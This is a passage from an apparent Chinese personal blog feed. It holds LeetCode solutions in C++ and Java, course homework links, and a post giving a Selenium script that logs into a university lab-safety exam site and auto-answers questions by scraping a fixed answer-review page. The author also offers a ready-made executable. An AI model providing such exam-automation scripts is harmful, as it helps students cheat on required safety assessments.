class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n)$。</li>
<li>空间复杂度：$O(n)$，即哈希表使用到的辅助空间的空间代价。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>我用的是第一种暴力统计方法，不过变量值加1的写法效率还不同，++ans;要优于ans+=1;😑</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>学业课程资料</title>
    <url>/2020/10/29/%E5%AD%A6%E6%A0%A1%E8%AF%BE%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>《学术道德论文与写作》课程作业，投稿信和催稿信的撰写==》<a href="/common/cover_letter.docx">点我下载文档</a></p>
<p>《自然辩证法》课程作业==》<a href="/common/nature_homework.docx">点我下载文档</a></p>
<p>《工程伦理》课程作业==》<a href="/common/project_homework.docx">点我下载文档</a></p>
<p>《学术英语》课程作业==》<a href="/common/AcademicEnglish.docx">点我下载文档</a></p>
<p>《学术英语》Presentation <a href="https://z2bns.github.io/2020/11/19/AcademicEnglish-presentation/">准备材料</a>， <a href="/common/high AnxietyPhobias.pptx">PPT</a></p>
<p>《数值分析》慕课作业==》<a href="/common/digit_mooc.docx">点我下载文档</a></p>
]]></content>
      <categories>
        <category>课程</category>
      </categories>
  </entry>
  <entry>
    <title>宝石和石头</title>
    <url>/2020/11/07/%E5%AE%9D%E7%9F%B3%E5%92%8C%E7%9F%B3%E5%A4%B4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/jewels-and-stones/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p> 给定字符串<code>J</code> 代表石头中宝石的类型，和字符串 <code>S</code>代表你拥有的石头。 <code>S</code> 中每个字符代表了一种你拥有的石头的类型，你想知道你拥有的石头中有多少是宝石。</p>
<p><code>J</code> 中的字母不重复，<code>J</code> 和 <code>S</code>中的所有字符都是字母。字母区分大小写，因此<code>&quot;a&quot;</code>和<code>&quot;A&quot;</code>是不同类型的石头。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: J &#x3D; &quot;aA&quot;, S &#x3D; &quot;aAAbbbb&quot;</span><br><span class="line">输出: 3</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: J &#x3D; &quot;z&quot;, S &#x3D; &quot;ZZ&quot;</span><br><span class="line">输出: 0</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ul>
<li><code>S</code> 和 <code>J</code> 最多含有50个字母。</li>
<li><code>J</code> 中的字符不重复。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历拥有的石头字符串S，对每一个字符如果在宝石字符串J中则数量result加1。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100%，内存消耗6.3M，击败45.80%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numJewelsInStones</span><span class="params">(<span class="built_in">string</span> J, <span class="built_in">string</span> S)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;S.length();++i)&#123;</span><br><span class="line">            <span class="comment">//是宝石</span></span><br><span class="line">            <span class="keyword">if</span>(J.find(S[i])!=<span class="built_in">string</span>::npos)&#123;</span><br><span class="line">                ++result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解："><a href="#官方题解：" class="headerlink" title="官方题解："></a><a href="https://leetcode-cn.com/problems/jewels-and-stones/solution/bao-shi-yu-shi-tou-by-leetcode-solution/">官方题解：</a></h6><h4 id="方法一：暴力"><a href="#方法一：暴力" class="headerlink" title="方法一：暴力"></a>方法一：暴力</h4><p><strong>思路与算法</strong></p>
<p>暴力法的思路很直观，遍历字符串 $S$，对于 $S$ 中的每个字符，遍历一次字符串 $J$，如果其和 $J$ 中的某一个字符相同，则是宝石</p>
<p><strong>代码：</strong>（执行0ms，击败100.00%，内存6.4M，击败21.25%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numJewelsInStones</span><span class="params">(<span class="built_in">string</span> J, <span class="built_in">string</span> S)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> jewelsCount = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> jewelsLength = J.length(), stonesLength = S.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; stonesLength; i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> stone = S[i];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; jewelsLength; j++) &#123;</span><br><span class="line">                <span class="keyword">char</span> jewel = J[j];</span><br><span class="line">                <span class="keyword">if</span> (stone == jewel) &#123;</span><br><span class="line">                    jewelsCount++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> jewelsCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><strong>时间复杂度：</strong>$O(mn)$，其中 $m$ 是字符串 $J$ 的长度，$n$ 是字符串 $S$ 的长度。遍历字符串 $S$ 的时间复杂度是 $O(n)$，对于 $S$ 中的每个字符，需要遍历字符串 $J$ 判断是否是宝石，时间复杂度是 $O(m)$，因此总时间复杂度是 $O(mn)$。</li>
<li><strong>空间复杂度：</strong>$O(1)$。只需要维护常量的额外空间。</li>
</ul>
<p><strong>方法二：哈希集合</strong><br><strong>思路与算法</strong></p>
<p>方法一中，对于字符串 $S$ 中的每个字符，都需要遍历一次字符串 $J$，导致时间复杂度较高。如果使用哈希集合存储字符串 $J$中的宝石，则可以降低判断的时间复杂度。</p>
<p>遍历字符串$ J$，使用哈希集合存储其中的字符，然后遍历字符串 $S$，对于其中的每个字符，如果其在哈希集合中，则是宝石。</p>
<p><strong>代码：</strong>（执行4ms，击败66.59%，内存6.6M，击败5.26%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numJewelsInStones</span><span class="params">(String J, String S)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> jewelsCount = <span class="number">0</span>;</span><br><span class="line">        Set&lt;Character&gt; jewelsSet = <span class="keyword">new</span> HashSet&lt;Character&gt;();</span><br><span class="line">        <span class="keyword">int</span> jewelsLength = J.length(), stonesLength = S.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; jewelsLength; i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> jewel = J.charAt(i);</span><br><span class="line">            jewelsSet.add(jewel);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; stonesLength; i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> stone = S.charAt(i);</span><br><span class="line">            <span class="keyword">if</span> (jewelsSet.contains(stone)) &#123;</span><br><span class="line">                jewelsCount++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> jewelsCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><strong>时间复杂度：</strong>$O(m+n)$，其中 $m$ 是字符串 $J$ 的长度，$n$ 是字符串 $S$ 的长度。遍历字符串 JJ 将其中的字符存储到哈希集合中，时间复杂度是 $O(m)$，然后遍历字符串 $S$，对于 $S$ 中的每个字符在 $O(1)$ 的时间内判断当前字符是否是宝石，时间复杂度是 $O(n)$，因此总时间复杂度是 $O(m+n)$。</li>
<li><strong>空间复杂度：</strong>$O(m)$，其中 $m$ 是字符串 $J$ 的长度。使用哈希集合存储字符串 $J$ 中的字符。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>简单题，暴力还是好用啊，哈哈哈。。。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>实验室安全考试系统自动答题</title>
    <url>/2020/10/26/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E5%AE%89%E5%85%A8%E8%80%83%E8%AF%95%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%8A%A8%E7%AD%94%E9%A2%98/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h6 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h6><p>学校要求在实验室安全考试系统上学习实验室安全相关的知识，然后完成一个考试。我就想着借这个机会把python  selenium自动化测试模块的知识再学一下以前只稍微用过那么一两下，反正就是乱搞嘛，学习这么枯燥当然要自己找点乐子了。完成了一个自动答题的一个脚本，输入自己的学号和密码，程序就会自动答题，最后结果应该是满分，仅此记录一下学习过程，不是为了答题才写的，实验室安全还是要好好了解一下的😄，具体代码如下</p>
<a id="more"></a>

<h6 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- codeing = utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2020/10/24</span></span><br><span class="line"><span class="comment"># @Author : loadding...</span></span><br><span class="line"><span class="comment"># @File : lab_safety.py</span></span><br><span class="line"><span class="comment"># @Software : jupyter</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getQuestionBank</span>():</span></span><br><span class="line"><span class="comment">#     url=&quot;http://aqks.neu.edu.cn/redir.php?catalog_id=6&amp;cmd=dajuan_chakan&amp;huihuabh=69338&amp;mode=test&quot;</span></span><br><span class="line">    url=<span class="string">&quot;http://aqks.neu.edu.cn/&quot;</span></span><br><span class="line">    response=requests.get(url)</span><br><span class="line">    page_source=response.text</span><br><span class="line">    <span class="comment">#print(page_source)</span></span><br><span class="line">    tree=etree.HTML(page_source)</span><br><span class="line">    arr=tree.xpath(<span class="string">&#x27;//*[@class=&quot;shiti&quot;]/strong&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(arr)</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_answer</span>(<span class="params">answer_source,question</span>):</span></span><br><span class="line">    <span class="comment">#匹配判断题答案</span></span><br><span class="line">    <span class="comment">#s=question+&#x27;&lt;/strong&gt;（分值1.0）&lt;br/&gt;你未作答标准答案：(.&#123;2,4&#125;?)&lt;/div&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#查了好久，终于知道为什么有的答案搜索不到了，比如某些问题里带有?，而?在正则里是有含义的，需要转义</span></span><br><span class="line">    question=question.replace(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;\\?&#x27;</span>)</span><br><span class="line">    question=question.replace(<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;\\(&#x27;</span>)</span><br><span class="line">    question=question.replace(<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;\\)&#x27;</span>)</span><br><span class="line">    <span class="comment">#.*?非贪婪模式匹配，匹配判断题、选择题</span></span><br><span class="line">    </span><br><span class="line">    s=question+<span class="string">&#x27;.*?你未作答标准答案：(.&#123;1,2&#125;?)&lt;/div&gt;&#x27;</span></span><br><span class="line">    <span class="comment">#s=&#x27;灾初起阶段是扑救火灾()的阶段。.*?你未作答标准答案：(.&#123;1,2&#125;?)&lt;/div&gt;&#x27;</span></span><br><span class="line">    <span class="comment">#print(s)</span></span><br><span class="line">    pattern=re.compile(s)</span><br><span class="line">    <span class="comment">#获取答案</span></span><br><span class="line">    answer=re.findall(pattern,answer_source)</span><br><span class="line">    <span class="comment">#返回搜索到的答案列表，注意可能为空列表</span></span><br><span class="line">    <span class="comment">#print(answer)</span></span><br><span class="line">    <span class="keyword">return</span> answer</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#登录网站</span></span><br><span class="line">        print(<span class="string">&quot;****************************欢迎来到实验室安全考试系统，本程序是自动答题脚本，祝您玩的愉快！！！*************************&quot;</span>)</span><br><span class="line">        username=input(<span class="string">&#x27;请输入学号：&#x27;</span>)</span><br><span class="line">        password=input(<span class="string">&#x27;请输入密码：&#x27;</span>)</span><br><span class="line">        <span class="comment">#实例化出一个Firefox浏览器</span></span><br><span class="line">        dr=webdriver.Chrome()</span><br><span class="line">        dr.get(<span class="string">&quot;http://aqks.neu.edu.cn/&quot;</span>)</span><br><span class="line">        dr.find_element_by_id(<span class="string">&#x27;u1&#x27;</span>).send_keys(username)</span><br><span class="line">        dr.find_element_by_id(<span class="string">&#x27;password&#x27;</span>).send_keys(password)</span><br><span class="line">        <span class="comment">#点击提交登录</span></span><br><span class="line">        dr.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;web_login&quot;]/div/form/div[3]/input&#x27;</span>).click()</span><br><span class="line">        <span class="keyword">if</span> dr.current_url==<span class="string">&#x27;http://aqks.neu.edu.cn/&#x27;</span>:</span><br><span class="line">            print(<span class="string">&quot;用户名或密码错误！请重新登录！！！&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#点击导航栏安全考试</span></span><br><span class="line">    dr.find_element_by_xpath(<span class="string">&#x27;/html/body/div[1]/div[2]/ul/li[3]/a&#x27;</span>).click()</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        type=input(<span class="string">&#x27;模拟考试/开始考试（输入1或2）：&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> type==<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="comment">#点击模拟考试</span></span><br><span class="line">            dr.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;article&quot;]/div[4]/div[2]/div/a[1]&#x27;</span>).click()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> type==<span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            <span class="comment">#点击开始考试</span></span><br><span class="line">            dr.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;article&quot;]/div[4]/div[2]/div/a[2]&#x27;</span>).click()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;输入错误，请重输！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#提取问题，定位的是第一个元素不是一个列表，改用其他方法</span></span><br><span class="line">    <span class="comment">#question=dr.find_element_by_class_name(&#x27;shiti&#x27;).text[2:-4]</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#获取答案</span></span><br><span class="line">    url=<span class="string">&quot;http://aqks.neu.edu.cn/redir.php?catalog_id=6&amp;cmd=dajuan_chakan&amp;huihuabh=69338&amp;mode=test&quot;</span></span><br><span class="line">    response=requests.get(url)</span><br><span class="line">    response.encoding=<span class="string">&#x27;gbk&#x27;</span><span class="comment">#网页是gbk编码</span></span><br><span class="line">    answer_source=response.text</span><br><span class="line">    <span class="comment">#去掉所有的空白符，包括换行符和空格、制表符</span></span><br><span class="line">    answer_source=re.sub(<span class="string">&#x27;\s&#x27;</span>,<span class="string">&#x27;&#x27;</span>,answer_source)</span><br><span class="line">    <span class="comment">#print(answer_source)</span></span><br><span class="line">    <span class="comment">#共有10页，每页10题</span></span><br><span class="line">    page=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(page&lt;<span class="number">10</span>):</span><br><span class="line">        <span class="comment">#获取当前页面源码（答题页）</span></span><br><span class="line">        page_source=dr.page_source</span><br><span class="line">        tree=etree.HTML(page_source)</span><br><span class="line">        question_list=tree.xpath(<span class="string">&#x27;//h3&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            question=question_list[i]</span><br><span class="line">            <span class="comment">#因为最大题号是100，再加上符号，所以从4开始截取</span></span><br><span class="line">            question=question.xpath(<span class="string">&#x27;string(.)&#x27;</span>)[<span class="number">4</span>:]</span><br><span class="line">            <span class="comment">#有的问题也会带有空格，先处理掉</span></span><br><span class="line">            question=re.sub(<span class="string">&#x27;\s&#x27;</span>,<span class="string">&#x27;&#x27;</span>,question)</span><br><span class="line">            <span class="comment">#搜索答案</span></span><br><span class="line">            answer=search_answer(answer_source,question)</span><br><span class="line">            <span class="comment">#print(answer)</span></span><br><span class="line">            <span class="keyword">if</span>(len(answer)==<span class="number">0</span>):</span><br><span class="line">                print(<span class="string">&quot;第&quot;</span>+str(<span class="number">10</span>*page+i+<span class="number">1</span>)+<span class="string">&quot;题未搜索到答案!&quot;</span>)</span><br><span class="line">                print(<span class="string">&quot;问题是：&quot;</span>+question)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            answer=answer[<span class="number">0</span>]</span><br><span class="line">            <span class="comment">#拼接按钮元素的id</span></span><br><span class="line">            id=<span class="string">&#x27;ti_&#x27;</span>+str(<span class="number">10</span>*page+i+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> answer==<span class="string">&#x27;错误&#x27;</span> <span class="keyword">or</span> answer==<span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">                id=id+<span class="string">&#x27;_0&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> answer==<span class="string">&#x27;正确&#x27;</span> <span class="keyword">or</span> answer==<span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">                id=id+<span class="string">&#x27;_1&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> answer==<span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">                id=id+<span class="string">&#x27;_2&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> answer==<span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">                id=id+<span class="string">&#x27;_3&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">&quot;搜索答案失败！！！&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            dr.find_element_by_id(id).click()</span><br><span class="line">        <span class="keyword">if</span> page==<span class="number">0</span>:</span><br><span class="line">            <span class="comment">#第一页时，点击下一页是input[1],其它页面是input[2]</span></span><br><span class="line">            path=<span class="string">&#x27;//*[@id=&quot;dati&quot;]/div[11]/input[1]&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            path=<span class="string">&#x27;//*[@id=&quot;dati&quot;]/div[11]/input[2]&#x27;</span></span><br><span class="line">        dr.find_element_by_xpath(path).click()</span><br><span class="line">        page=page+<span class="number">1</span></span><br><span class="line">    <span class="comment">#答题页面共有10页</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h6 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h6><p>程序运行过程中会调出chrome浏览器，可以看到程序自动答题过程，答题结束会询问是否提交需要手动确定提交，另外需要用到一个Chrome浏览器驱动程序需要和自己的chrome浏览器版本匹配，<a href="http://chromedriver.storage.googleapis.com/index.html">点我下载</a>，下载后要配置环境变量或者直接放到已经在环境变量里的目录中。如果没有python环境用我打包好的exe程序，<a href="/video/lab_safe.exe">点击下载</a>，不需要python环境就可运行，不过还是需要下载上面chrome浏览器驱动😎</p>
<p>下面这张图是程序自动答题提交后的结果，满分。。。因为已经答过题了所以是用模拟考试测试的🙂</p>
<p><img src="/2020/10/26/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E5%AE%89%E5%85%A8%E8%80%83%E8%AF%95%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%8A%A8%E7%AD%94%E9%A2%98/image-20201026145032142.png" alt="image-20201026145032142"></p>
<p>下面是程序自动答题的运行过程，插入视频的dplayer插件也整了好久不过还好成功了😝，浏览器播放不了MP4，需要使用格式工厂把mp4格式视频的编码转换成H264编码。。。</p>
<div id="dplayer1" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer1"),"hotkey":true,"preload":"metadata","video":{"url":"/video/answer.mp4","pic":"/video/cover.png"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script> 

<p>仅此记录一下，以后如果有其他类似的需求可以参考一下，比如网课答题？？😂</p>
]]></content>
      <categories>
        <category>课程</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>将数字变成0的操作次数</title>
    <url>/2020/11/09/%E5%B0%86%E6%95%B0%E5%AD%97%E5%8F%98%E6%88%900%E7%9A%84%E6%93%8D%E4%BD%9C%E6%AC%A1%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/number-of-steps-to-reduce-a-number-to-zero/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个非负整数 <code>num</code> ，请你返回将它变成 0 所需要的步数。 如果当前数字是偶数，你需要把它除以 2 ；否则，减去 1 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 14</span><br><span class="line">输出：6</span><br><span class="line">解释：</span><br><span class="line">步骤 1) 14 是偶数，除以 2 得到 7 。</span><br><span class="line">步骤 2） 7 是奇数，减 1 得到 6 。</span><br><span class="line">步骤 3） 6 是偶数，除以 2 得到 3 。</span><br><span class="line">步骤 4） 3 是奇数，减 1 得到 2 。</span><br><span class="line">步骤 5） 2 是偶数，除以 2 得到 1 。</span><br><span class="line">步骤 6） 1 是奇数，减 1 得到 0 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 8</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">步骤 1） 8 是偶数，除以 2 得到 4 。</span><br><span class="line">步骤 2） 4 是偶数，除以 2 得到 2 。</span><br><span class="line">步骤 3） 2 是偶数，除以 2 得到 1 。</span><br><span class="line">步骤 4） 1 是奇数，减 1 得到 0 。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 123</span><br><span class="line">输出：12</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>0 &lt;= num &lt;= 10^6</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>根据题目描述直接模拟就行了，while循环判断是否为0，循环中判断奇偶然后进行相关操作。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.3M，击败5.00%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numberOfSteps</span> <span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(num)&#123;</span><br><span class="line">            <span class="comment">//偶数</span></span><br><span class="line">            <span class="keyword">if</span>(num%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                num/=<span class="number">2</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                --num;</span><br><span class="line">            &#125;</span><br><span class="line">            ++result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，题目比较简单，根据题意直接模拟就好了。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>左旋转字符串</title>
    <url>/2020/11/06/%E5%B7%A6%E6%97%8B%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/zuo-xuan-zhuan-zi-fu-chuan-lcof/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
